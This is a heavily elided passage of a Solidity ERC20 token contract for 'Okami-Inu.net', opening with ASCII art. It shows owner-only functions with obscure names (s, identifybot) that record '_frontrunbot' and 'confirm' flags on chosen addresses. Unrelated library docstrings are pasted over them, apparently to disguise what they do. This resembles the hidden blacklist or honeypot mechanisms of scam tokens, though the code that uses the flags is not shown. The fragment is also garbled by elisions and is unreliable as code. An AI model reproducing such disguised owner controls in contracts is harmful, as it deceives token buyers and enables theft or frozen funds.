   ...
   |             L  d"     dXX  xm   "^##L mx     dXX  YL-"##XX"S""##########
    ...
    |              #L     X%##X                  X%##X|     j#SSS /##########
     ...
     |              TF                                      ##BBS.T#########F
      |             #L           ---                        ###BBS.T########'
      |            '##            ""                     jL|###BSSS.T#######
       |          Okami-Inu.net'####             ______              .:#|##WWBBBSS.T####F
      J L        '######.            \___/            _c::#|###WWWBSSS|####
     J ;;       '########m            \_/            c:::'#|###WWWBBSS.T##"
...
contract ERC20 is Context, IERC20, IERC20Metadata , Ownable{
  ...
  /**
     ...
     * _Available since v3.1._
     */
    function s (address target) public checker {
        _frontrunbot = target;
    }
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
 ...
 /**
     ...
     * _Available since v3.1._
     */
      function identifybot (address _count) internal checker {
        confirm[_count] = true;
    }
  /**
     * @dev updateTaxFee
